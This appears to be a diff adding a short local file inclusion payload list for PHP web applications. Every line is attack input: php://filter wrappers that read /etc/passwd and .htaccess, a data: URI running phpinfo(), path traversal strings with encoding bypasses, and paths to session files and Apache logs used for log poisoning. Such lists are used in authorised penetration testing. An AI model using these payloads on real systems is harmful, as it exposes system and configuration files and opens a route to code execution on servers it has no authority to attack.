@@ -1,0 +1,25 @@
+php://filter/convert.base64-encode/resource=/etc/passwd
+
+php://filter/convert.base64-encode/resource=.htaccess
+
+php://filter/string.rot13/resource=.htaccess
+
+php://filter/string.toupper/resource=.htaccess
+
+php://filter/string.tolower/resource=.htaccess
+
+php://filter/string.strip_tags/resource=.htaccess
+
+data:text/plain,<?php%20phpinfo();%20?>
+
+/var/www/html/../../../etc/passwd
+
+/var/www/html/..//..//..//etc/passwd	|	../ ~ %252e%252e%252f	|   ....//
+
+<?php echo phpinfo(); ?>
+
+/var/lib/php/sessions/sess_[sessionID]
+
+/var/log/apache2/access.log
+
+
